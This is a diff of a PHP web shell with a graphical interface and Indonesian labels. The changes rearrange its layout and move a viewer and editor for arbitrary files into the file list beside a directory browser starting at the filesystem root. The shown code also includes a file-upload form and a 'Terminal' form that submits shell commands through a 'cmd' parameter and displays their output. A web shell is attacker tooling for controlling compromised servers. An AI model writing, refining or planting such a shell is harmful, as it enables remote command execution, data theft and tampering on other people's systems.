@@ -90,7 +90,7 @@ if (isset($_GET['cmd'])) {
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>🌐 PHP Shell GUI - Panel Kanan Vertikal</title>
+<title>🌐 PHP Shell GUI with Back & Top Panel</title>
 <style>
     body {
         background: #1e1e2f; color: #cfd2dc; font-family: monospace; margin:0; padding: 20px;
@@ -124,12 +124,9 @@ if (isset($_GET['cmd'])) {
         padding: 10px;
         border-radius: 8px;
     }
-    input, select, textarea {
+    input, select {
         padding: 4px; background: #111; color: #0f0; border: 1px solid #555; margin: 2px;
         font-family: monospace;
-    }
-    textarea {
-        resize: vertical;
     }
     input[type=submit], button.mini-btn {
         background: #333; color: white; cursor: pointer; border: none;
@@ -198,10 +195,11 @@ if (isset($_GET['cmd'])) {
 
 <div class="container">
     <div id="file-list">
-
 <?php
-// Breadcrumb path
+// Breadcrumb path dengan root /
 echo "<div class='path'><b>📁 Path:</b> ";
+echo "<a href='?path=" . urlencode(DIRECTORY_SEPARATOR) . "'>/</a> / ";
+
 $parts = explode(DIRECTORY_SEPARATOR, $path);
 $nav = "";
 foreach ($parts as $p) {
@@ -280,8 +278,28 @@ foreach ($all as $file) {
     </div>";
 }
 echo "</div>";
-?>
 
+// File viewer atau editor
+if (isset($_GET['view'])) {
+    $viewFile = $path . DIRECTORY_SEPARATOR . $_GET['view'];
+    if (is_file($viewFile)) {
+        $content = htmlspecialchars(file_get_contents($viewFile));
+        echo "<div class='box'><b>📄 Isi file:</b> " . htmlspecialchars($_GET['view']) . "<pre>$content</pre></div>";
+    }
+} elseif (isset($_GET['edit'])) {
+    $editFile = $path . DIRECTORY_SEPARATOR . $_GET['edit'];
+    if (is_file($editFile)) {
+        $content = htmlspecialchars(file_get_contents($editFile));
+        echo "<div class='box'><b>✍️ Edit file:</b> " . htmlspecialchars($_GET['edit']) . "
+            <form method='POST'>
+                <input type='hidden' name='filename' value='" . htmlspecialchars($_GET['edit']) . "'>
+                <textarea name='save_file' style='width:100%; height:300px; background:#111; color:#0f0; border:1px solid #555; font-family: monospace;'>$content</textarea><br>
+                <input type='submit' value='Simpan Perubahan'>
+            </form>
+        </div>";
+    }
+}
+?>
     </div> <!-- end file-list -->
 
     <div id="side-panel">
@@ -300,7 +318,6 @@ echo "</div>";
                 <input type="submit" value="Upload File">
             </form>
         </div>
-
         <div id="terminal">
             <h3>💻 Terminal</h3>
             <form method="GET">
@@ -308,37 +325,12 @@ echo "</div>";
                 <input type="text" name="cmd" placeholder="Perintah shell..." style="width:90%;">
                 <input type="submit" value="Run">
             </form>
-<?php if ($output): ?>
-            <pre><?= htmlspecialchars($output) ?></pre>
-<?php endif; ?>
-        </div>
-
 <?php
-// File viewer atau editor tampil di panel kanan di bawah terminal
-if (isset($_GET['view'])) {
-    $viewFile = $path . DIRECTORY_SEPARATOR . $_GET['view'];
-    if (is_file($viewFile)) {
-        $content = htmlspecialchars(file_get_contents($viewFile));
-        echo "<div id='file-viewer' style='margin-top:15px; background:#222; padding:10px; border-radius:8px; max-height:300px; overflow:auto; color:#0f0; font-family: monospace;'>
-                <b>📄 Isi file: " . htmlspecialchars($_GET['view']) . "</b><pre>$content</pre>
-              </div>";
-    }
-} elseif (isset($_GET['edit'])) {
-    $editFile = $path . DIRECTORY_SEPARATOR . $_GET['edit'];
-    if (is_file($editFile)) {
-        $content = htmlspecialchars(file_get_contents($editFile));
-        echo "<div id='file-editor' style='margin-top:15px;'>
-                <b>✍️ Edit file: " . htmlspecialchars($_GET['edit']) . "</b>
-                <form method='POST'>
-                    <input type='hidden' name='filename' value='" . htmlspecialchars($_GET['edit']) . "'>
-                    <textarea name='save_file' style='width:100%; height:300px; background:#111; color:#0f0; font-family: monospace; padding:10px; border-radius:8px; border:none;'>$content</textarea><br>
-                    <input type='submit' value='Simpan Perubahan' style='background:#3a3; color:#fff; cursor:pointer; padding:8px 15px; border:none; border-radius:5px;'>
-                </form>
-              </div>";
-    }
+if ($output) {
+    echo "<pre>" . htmlspecialchars($output) . "</pre>";
 }
 ?>
-
+        </div>
     </div> <!-- end side-panel -->
 </div> <!-- end container -->
 
